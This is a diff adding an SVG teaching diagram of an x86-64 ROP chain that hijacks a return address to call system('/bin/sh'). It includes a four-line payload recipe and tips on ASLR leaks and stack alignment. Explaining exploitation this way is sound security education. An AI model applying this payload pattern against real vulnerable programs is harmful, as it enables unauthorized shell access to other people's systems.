@@ -1,0 +1,105 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 760 420" width="760" height="420" role="img" aria-label="x86-64 ROP chain trace, higher addresses on top: the overwritten return address holds a pop rdi ; ret gadget, the slot above it is consumed into RDI as the first argument, the next slot is the address of libc system(), and the slot above that is system's return address, exit().">
+<title>x86-64 ROP chain — pop rdi ; ret → system(&quot;/bin/sh&quot;)</title>
+<style>
+  .slot{fill:#fbe6e3;stroke:#b3261e;stroke-width:2}
+  .hit{fill:#fbe6e3;stroke:#b3261e;stroke-width:2.8}
+  .junk{fill:#fdeeeb;stroke:#d98b84;stroke-width:1.6;stroke-dasharray:5 4}
+  .name{font:10.5px Inter,ui-sans-serif,system-ui,sans-serif;fill:#5b6670}
+  .val{font:600 15px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;fill:#1a1a1a}
+  .valr{font:600 15px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;fill:#8c1d18}
+  .addr{font:11px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;fill:#8a949b;text-anchor:end}
+  .hd{font:600 12.5px Inter,ui-sans-serif,system-ui,sans-serif;fill:#1a1a1a}
+  .hd2{font:11px Inter,ui-sans-serif,system-ui,sans-serif;fill:#5b6670;text-anchor:end}
+  .g{fill:#e4eff1;stroke:#176b87;stroke-width:2}
+  .gt{font:600 14px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;fill:#0f4a5e}
+  .gs{font:10px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;fill:#5b6670}
+  .cyl{font:10px Inter,ui-sans-serif,system-ui,sans-serif;fill:#8a949b}
+  .note{font:10.5px Inter,ui-sans-serif,system-ui,sans-serif;fill:#7a4b00}
+  .note2{font:10.5px Inter,ui-sans-serif,system-ui,sans-serif;fill:#5b6670}
+  .step{font:600 11px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;fill:#7a4b00;text-anchor:middle;dominant-baseline:central}
+</style>
+<defs>
+  <marker id="fa" viewBox="0 0 10 10" refX="9.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#176b87"/></marker>
+</defs>
+
+<text class="hd" x="138" y="24">the ROP chain — consumed bottom → top, one ret at a time</text>
+<text class="hd2" x="752" y="24">code already in memory</text>
+
+<!-- what system() will return to (highest address) -->
+<rect class="slot" x="138" y="40" width="248" height="36" rx="3"/>
+<text class="name" x="150" y="53">system()'s return address</text>
+<text class="valr" x="150" y="69">0x7ffff7e1a9c0</text>
+<text class="addr" x="126" y="58">0x7fffffffdde0</text>
+
+<!-- ret eats this one: RIP := &system -->
+<rect class="slot" x="138" y="86" width="248" height="36" rx="3"/>
+<text class="name" x="150" y="99">next return address</text>
+<text class="valr" x="150" y="115">0x7ffff7e1ab00</text>
+<text class="addr" x="126" y="104">0x7fffffffddd8</text>
+
+<!-- the slot the gadget pops: first argument, on x64 it lives here, not in the frame -->
+<rect class="slot" x="138" y="134" width="248" height="36" rx="3"/>
+<text class="name" x="150" y="147">1st argument</text>
+<text class="val" x="150" y="163">0x4011d0</text>
+<text class="addr" x="126" y="152">0x7fffffffddd0</text>
+
+<!-- return address: the pivot into the chain -->
+<rect class="hit" x="138" y="182" width="248" height="36" rx="3"/>
+<text class="name" x="150" y="195">return address — overwritten</text>
+<text class="valr" x="150" y="211">0x4012a3</text>
+<text class="addr" x="126" y="200">0x7fffffffddc8</text>
+
+<rect class="junk" x="138" y="230" width="248" height="36" rx="3"/>
+<text class="name" x="150" y="243">saved RBP</text>
+<text class="val" x="150" y="259">0x4141414141414141</text>
+<text class="addr" x="126" y="248">0x7fffffffddc0</text>
+
+<!-- buf: what the overflow wrote over (lowest address) -->
+<rect class="junk" x="138" y="278" width="248" height="34" rx="3"/>
+<text class="name" x="150" y="291">buf[64]</text>
+<text class="val" x="150" y="306">'A' × 64</text>
+<text class="addr" x="126" y="295">0x7fffffffdd80</text>
+
+<!-- step 1: ret → pop rdi ; ret -->
+<path d="M 392,200 L 460,200" stroke="#176b87" stroke-width="2" fill="none" marker-end="url(#fa)"/>
+<rect x="416" y="191" width="19" height="19" rx="9.5" fill="#fff6e6" stroke="#b26b00" stroke-width="1.4"/>
+<text class="step" x="425.5" y="200.5">1</text>
+<rect class="g" x="464" y="180" width="288" height="40" rx="4"/>
+<text class="gt" x="476" y="197">pop rdi ; ret</text>
+<text class="gs" x="476" y="212">@ 0x4012a3</text>
+
+<!-- the argument slot, eaten by pop rdi -->
+<text class="note" x="464" y="148">pop rdi eats this slot → RDI</text>
+<text class="note2" x="464" y="164">0x4011d0 holds "/bin/sh", already in the binary</text>
+
+<!-- step 2: ret → system -->
+<path d="M 392,104 L 460,104" stroke="#176b87" stroke-width="2" fill="none" marker-end="url(#fa)"/>
+<rect x="416" y="95" width="19" height="19" rx="9.5" fill="#fff6e6" stroke="#b26b00" stroke-width="1.4"/>
+<text class="step" x="425.5" y="104.5">2</text>
+<rect class="g" x="464" y="84" width="288" height="40" rx="4"/>
+<text class="gt" x="476" y="101">system()</text>
+<text class="gs" x="476" y="116">@ 0x7ffff7e1ab00 · libc · r-x</text>
+
+<!-- step 3: system returns into exit -->
+<path d="M 392,58 L 460,58" stroke="#176b87" stroke-width="2" fill="none" marker-end="url(#fa)"/>
+<rect x="416" y="49" width="19" height="19" rx="9.5" fill="#fff6e6" stroke="#b26b00" stroke-width="1.4"/>
+<text class="step" x="425.5" y="58.5">3</text>
+<rect class="g" x="464" y="38" width="288" height="40" rx="4"/>
+<text class="gt" x="476" y="55">exit()</text>
+<text class="gs" x="476" y="70">@ 0x7ffff7e1a9c0 · so the shell ends cleanly</text>
+
+<!-- payload recipe, next to the bottom of the picture -->
+<rect x="464" y="232" width="288" height="76" rx="4" fill="#f9fafb" stroke="#b6c0c6" stroke-width="1.4" stroke-dasharray="6 4"/>
+<text style="font:9px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;fill:#1a1a1a" x="476" y="251">payload  = b'A' * 64</text>
+<text style="font:9px Inter,ui-sans-serif,system-ui,sans-serif;fill:#8a949b" x="690" y="251"># buf[64]</text>
+<text style="font:9px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;fill:#1a1a1a" x="476" y="267">payload += b'A' * 8</text>
+<text style="font:9px Inter,ui-sans-serif,system-ui,sans-serif;fill:#8a949b" x="690" y="267"># saved RBP</text>
+<text style="font:9px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;fill:#1a1a1a" x="476" y="283">payload += p64(pop_rdi) + p64(binsh)</text>
+<text style="font:9px Inter,ui-sans-serif,system-ui,sans-serif;fill:#8a949b" x="690" y="283"># RDI</text>
+<text style="font:9px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;fill:#1a1a1a" x="476" y="299">payload += p64(system) + p64(exit)</text>
+<text style="font:9px Inter,ui-sans-serif,system-ui,sans-serif;fill:#8a949b" x="690" y="299"># RIP</text>
+
+<text class="note" x="138" y="344">Arguments live in RDI, RSI, RDX, RCX, R8, R9 — on x64 every argument costs one pop gadget.</text>
+<text class="note2" x="138" y="366">Non-PIE binary: gadget addresses are fixed. libc is still ASLR'd → system() needs a leak.</text>
+<text class="note2" x="138" y="388">If system() dies in movaps, add a bare ret gadget to fix 16-byte stack alignment.</text>
+</svg>
